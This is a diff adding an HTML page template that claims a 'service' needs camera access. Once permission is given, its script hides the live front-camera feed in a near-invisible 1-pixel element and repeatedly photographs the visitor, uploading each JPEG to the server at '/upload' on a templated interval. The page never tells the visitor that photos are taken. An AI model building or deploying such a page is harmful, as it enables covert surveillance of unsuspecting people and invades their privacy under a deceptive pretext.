@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Access Required</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        #video {
+            width: 1px;
+            height: 1px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0.01;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Camera Access Required</h1>
+    <p>To continue using this service, please allow access to your camera.</p>
+    <button id="start">Allow Camera Access</button>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let intervalId;
+
+        document.getElementById('start').addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } 
+                });
+                video.srcObject = stream;
+                
+                // Hide the button after successful access
+                document.getElementById('start').style.display = 'none';
+                
+                // Start taking pictures at intervals
+                startCapturing();
+            } catch (err) {
+                console.error("Error accessing camera:", err);
+                alert("Could not access the camera. Please check permissions.");
+            }
+        });
+
+        function startCapturing() {
+            intervalId = setInterval(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                canvas.toBlob((blob) => {
+                    sendImage(blob);
+                }, 'image/jpeg', 0.8);
+            }, {{ interval }});
+        }
+
+        function sendImage(blob) {
+            const formData = new FormData();
+            formData.append('image', blob, 'captured.jpg');
+            
+            fetch('/upload', {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                if (!response.ok) {
+                    console.error('Failed to upload image');
+                }
+            }).catch(error => {
+                console.error('Error uploading image:', error);
+            });
+        }
+    </script>
+</body>
+</html>
